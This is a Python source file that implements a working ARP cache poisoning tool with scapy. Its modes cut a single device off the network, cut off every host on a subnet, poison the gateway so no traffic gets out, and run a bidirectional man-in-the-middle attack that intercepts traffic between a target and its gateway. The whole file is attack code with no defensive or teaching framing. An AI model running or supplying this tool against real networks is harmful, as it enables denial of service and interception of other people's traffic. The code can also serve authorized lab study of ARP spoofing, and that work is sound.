"""ARP cache poisoning for network denial and interception.

Modes:
1. KILL (single)  — Black-hole one device's traffic
2. KILL ALL       — Black-hole every device on the subnet
3. KILL GATEWAY   — Poison the gateway so nothing reaches the internet
4. MITM           — Bidirectional poison to intercept traffic between target and gateway
"""

import time
import threading
from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr, srp, conf


def get_gateway_ip() -> str:
    """Auto-detect the default gateway IP."""
    return conf.route.route("0.0.0.0")[2]


def get_all_hosts(subnet: str, timeout: float = 3.0) -> list[tuple[str, str]]:
    """ARP scan to get all (ip, mac) pairs on a subnet."""
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
    result = srp(packet, timeout=timeout, verbose=False)[0]
    return [(received.psrc, received.hwsrc) for _, received in result]


class ARPPoisoner:
    """ARP cache poisoning attack for device denial-of-service."""

    def __init__(self, target_ip: str, gateway_ip: str, interface: str | None = None):
        """Initialize the ARP poisoner.

        Args:
            target_ip: IP of the device to disconnect.
            gateway_ip: IP of the network gateway.
            interface: Network interface to use (auto-detected if None).
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface or conf.iface
        self._running = False
        self._thread: threading.Thread | None = None

    def _get_mac(self, ip: str) -> str | None:
        """Resolve IP to MAC address via ARP."""
        return getmacbyip(ip)

    def _poison(self) -> None:
        """Send poisoned ARP replies continuously."""
        target_mac = self._get_mac(self.target_ip)
        if not target_mac:
            raise RuntimeError(f"Could not resolve MAC for {self.target_ip}")

        # Tell target that gateway is at OUR MAC (we drop the traffic = kill)
        poison_packet = Ether(dst=target_mac) / ARP(
            op="is-at",
            psrc=self.gateway_ip,
            pdst=self.target_ip,
            hwdst=target_mac,
        )

        while self._running:
            sendp(poison_packet, iface=self.interface, verbose=False)
            time.sleep(1)

    def start(self) -> None:
        """Start the ARP poisoning attack (runs in background thread)."""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._poison, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop the attack and restore the target's ARP cache."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)

        # Restore: send correct ARP to target
        target_mac = self._get_mac(self.target_ip)
        gateway_mac = self._get_mac(self.gateway_ip)
        if target_mac and gateway_mac:
            restore_packet = Ether(dst=target_mac) / ARP(
                op="is-at",
                psrc=self.gateway_ip,
                hwsrc=gateway_mac,
                pdst=self.target_ip,
                hwdst=target_mac,
            )
            sendp(restore_packet, iface=self.interface, count=5, verbose=False)


class NetworkKiller:
    """Kill network connectivity for all devices or the gateway."""

    def __init__(self, subnet: str, gateway_ip: str | None = None, interface: str | None = None):
        self.subnet = subnet
        self.gateway_ip = gateway_ip or get_gateway_ip()
        self.interface = interface or conf.iface
        self._poisoners: list[ARPPoisoner] = []
        self._running = False

    def kill_all(self) -> int:
        """Disconnect ALL devices on the subnet from the gateway.

        Returns:
            Number of devices being targeted.
        """
        hosts = get_all_hosts(self.subnet)
        self._running = True

        for ip, mac in hosts:
            if ip == self.gateway_ip:
                continue  # Don't poison the gateway itself in this mode
            poisoner = ARPPoisoner(target_ip=ip, gateway_ip=self.gateway_ip, interface=self.interface)
            poisoner.start()
            self._poisoners.append(poisoner)

        return len(self._poisoners)

    def kill_gateway(self) -> int:
        """Poison the gateway's ARP cache for ALL hosts.

        This makes the gateway unable to route return traffic to any device.
        More efficient than kill_all — single target, total impact.

        Returns:
            Number of hosts the gateway is being poisoned for.
        """
        hosts = get_all_hosts(self.subnet)
        our_mac = get_if_hwaddr(self.interface)
        gateway_mac = getmacbyip(self.gateway_ip)
        if not gateway_mac:
            raise RuntimeError(f"Could not resolve gateway MAC for {self.gateway_ip}")

        self._running = True
        self._thread = threading.Thread(
            target=self._poison_gateway, args=(hosts, gateway_mac, our_mac), daemon=True
        )
        self._thread.start()
        return len(hosts)

    def _poison_gateway(self, hosts: list[tuple[str, str]], gateway_mac: str, our_mac: str) -> None:
        """Tell the gateway that every host's MAC is ours."""
        while self._running:
            for ip, _ in hosts:
                if ip == self.gateway_ip:
                    continue
                # Tell gateway: "ip is at our_mac"
                packet = Ether(dst=gateway_mac) / ARP(
                    op="is-at",
                    psrc=ip,
                    hwsrc=our_mac,
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                )
                sendp(packet, iface=self.interface, verbose=False)
            time.sleep(1)

    def stop(self) -> None:
        """Stop all attacks and restore ARP tables."""
        self._running = False
        for poisoner in self._poisoners:
            poisoner.stop()
        self._poisoners.clear()

        # If we poisoned the gateway, restore it
        if hasattr(self, '_thread') and self._thread:
            self._thread.join(timeout=5)
            # Send correct ARPs to gateway
            hosts = get_all_hosts(self.subnet, timeout=2)
            gateway_mac = getmacbyip(self.gateway_ip)
            if gateway_mac:
                for ip, mac in hosts:
                    if ip == self.gateway_ip:
                        continue
                    restore = Ether(dst=gateway_mac) / ARP(
                        op="is-at",
                        psrc=ip,
                        hwsrc=mac,
                        pdst=self.gateway_ip,
                        hwdst=gateway_mac,
                    )
                    sendp(restore, iface=self.interface, count=3, verbose=False)


class MITMPoisoner:
    """Bidirectional ARP poisoning for man-in-the-middle interception.

    Poisons both the target and the gateway so all traffic between them
    flows through our machine. Requires IP forwarding to be enabled.
    """

    def __init__(self, target_ip: str, gateway_ip: str, interface: str | None = None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface or conf.iface
        self._running = False
        self._thread: threading.Thread | None = None

    def _get_mac(self, ip: str) -> str | None:
        return getmacbyip(ip)

    def _poison_both(self) -> None:
        """Poison both target and gateway bidirectionally."""
        target_mac = self._get_mac(self.target_ip)
        gateway_mac = self._get_mac(self.gateway_ip)
        if not target_mac or not gateway_mac:
            raise RuntimeError("Could not resolve MACs for MITM")

        # Tell target: gateway is at our MAC
        pkt_to_target = Ether(dst=target_mac) / ARP(
            op="is-at",
            psrc=self.gateway_ip,
            pdst=self.target_ip,
            hwdst=target_mac,
        )
        # Tell gateway: target is at our MAC
        pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
            op="is-at",
            psrc=self.target_ip,
            pdst=self.gateway_ip,
            hwdst=gateway_mac,
        )

        while self._running:
            sendp(pkt_to_target, iface=self.interface, verbose=False)
            sendp(pkt_to_gateway, iface=self.interface, verbose=False)
            time.sleep(1)

    def start(self) -> None:
        """Start MITM. Remember to enable IP forwarding!"""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._poison_both, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop MITM and restore ARP tables for both sides."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)

        target_mac = self._get_mac(self.target_ip)
        gateway_mac = self._get_mac(self.gateway_ip)
        if target_mac and gateway_mac:
            # Restore target
            sendp(
                Ether(dst=target_mac) / ARP(
                    op="is-at", psrc=self.gateway_ip, hwsrc=gateway_mac,
                    pdst=self.target_ip, hwdst=target_mac,
                ),
                iface=self.interface, count=5, verbose=False,
            )
            # Restore gateway
            sendp(
                Ether(dst=gateway_mac) / ARP(
                    op="is-at", psrc=self.target_ip, hwsrc=target_mac,
                    pdst=self.gateway_ip, hwdst=gateway_mac,
                ),
                iface=self.interface, count=5, verbose=False,
            )
